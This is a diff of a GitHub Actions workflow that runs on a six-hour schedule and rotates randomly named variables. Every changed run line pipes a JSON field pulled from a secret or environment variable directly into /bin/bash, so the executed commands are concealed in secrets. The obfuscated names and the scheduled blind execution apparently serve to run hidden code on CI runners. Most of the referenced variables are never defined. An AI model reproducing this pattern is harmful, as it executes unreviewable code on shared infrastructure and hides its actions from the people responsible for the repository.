@@ -2,30 +2,27 @@ name: liangtoushang5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
+    - cron: '57 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liangtoushang5678
         env:
-          ae55: ${{ secrets.ae55 }}
+          tt3: ${{ secrets.tt3 }}
         run: |
-          echo $ae55 | jq -r .r73 | /bin/bash
-          echo $ly3 | jq -r .i98 | /bin/bash
-          echo $rc6 | jq -r .gj10 | /bin/bash
-          echo $dbsr7 | jq -r .c2392 | /bin/bash
-          echo $jwobj7 | jq -r .hfywb7505 | /bin/bash
-          echo $ntqpx0901 | jq -r .engb61757 | /bin/bash
-          echo $udhd22 | jq -r .x051 | /bin/bash
-          echo $vfwyu9393 | jq -r .p9022 | /bin/bash
-          echo $vubo45378 | jq -r .c601 | /bin/bash
-          echo $ixjaq778 | jq -r .gi3098 | /bin/bash
-          echo $juquu46 | jq -r .yqbe59 | /bin/bash
-          echo $byktl250 | jq -r .t3 | /bin/bash
-          echo $cusl1718 | jq -r .qk730 | /bin/bash
-          echo $g10 | jq -r .bdlwt84115 | /bin/bash
-          echo $ejwd86409 | jq -r .ez02026 | /bin/bash
+          echo $tt3 | jq -r .spd881 | /bin/bash
+          echo $l7 | jq -r .sgmzq26 | /bin/bash
+          echo $t96651 | jq -r .jkpph92 | /bin/bash
+          echo $b52 | jq -r .aveql0296 | /bin/bash
+          echo $t32682 | jq -r .to06 | /bin/bash
+          echo $vmmou30 | jq -r .mso25 | /bin/bash
+          echo $xrblq071 | jq -r .v8291 | /bin/bash
+          echo $erk17 | jq -r .mtha0639 | /bin/bash
+          echo $ii55600 | jq -r .ojcy1 | /bin/bash
+          echo $ftl3829 | jq -r .abxew5 | /bin/bash
+          echo $gvv43 | jq -r .p514 | /bin/bash
+          echo $f10956 | jq -r .kgv7495 | /bin/bash
 
